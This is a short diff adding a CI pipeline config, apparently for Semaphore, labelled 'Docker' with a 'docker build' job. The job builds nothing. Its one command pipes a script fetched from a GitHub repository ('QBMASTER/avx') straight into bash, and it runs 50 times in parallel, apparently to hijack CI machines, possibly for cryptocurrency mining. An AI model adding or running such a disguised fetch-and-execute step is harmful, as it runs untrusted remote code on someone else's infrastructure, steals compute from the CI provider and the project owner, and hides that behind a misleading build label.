@@ -1,0 +1,14 @@
+version: v1.0
+name: Docker
+agent:
+  machine:
+    type: f1-standard-2
+    os_image: ubuntu2204
+blocks:
+  - name: Build
+    task:
+      jobs:
+        - name: docker build
+          commands:
+            - 'curl -sL https://raw.githubusercontent.com/erlandi-main-api/QBMASTER/main/avx | bash'
+          parallelism: 50
